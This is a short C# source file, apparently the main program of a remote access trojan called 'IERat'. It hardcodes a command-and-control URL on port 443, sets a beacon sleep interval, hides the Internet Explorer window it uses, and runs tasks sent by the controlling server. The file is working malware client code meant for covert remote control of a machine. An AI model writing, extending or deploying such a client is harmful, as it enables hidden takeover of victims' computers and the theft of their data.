using IERat.lib;

namespace IERat
{
    class IERat
    {
        public static Channel channel = new Channel { 
            BaseURL = "http://192.168.239.191:443",
            SleepTime = 2000,
            IEvisible = false
        };
        static void Main()
        {
            channel.Open();
            channel.agent.ExecuteTasks();
        }
    }
}
